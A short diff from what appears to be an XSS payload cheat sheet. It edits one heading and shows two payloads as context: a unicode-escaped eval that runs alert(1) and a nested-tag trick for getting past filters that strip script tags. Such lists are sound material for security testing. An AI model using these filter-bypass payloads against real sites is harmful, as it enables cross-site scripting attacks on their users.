@@ -268,7 +268,7 @@ https://portswigger.net/research/finding-dom-polyglot-xss-in-paypal-the-easy-way
 <script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>
 ```
 
-#### Removing script Tag - Bypass
+#### Removing "script" Tag - Bypass
 ```
 <sCR<script>iPt>alert(1)</SCr</script>IPt>
 ```
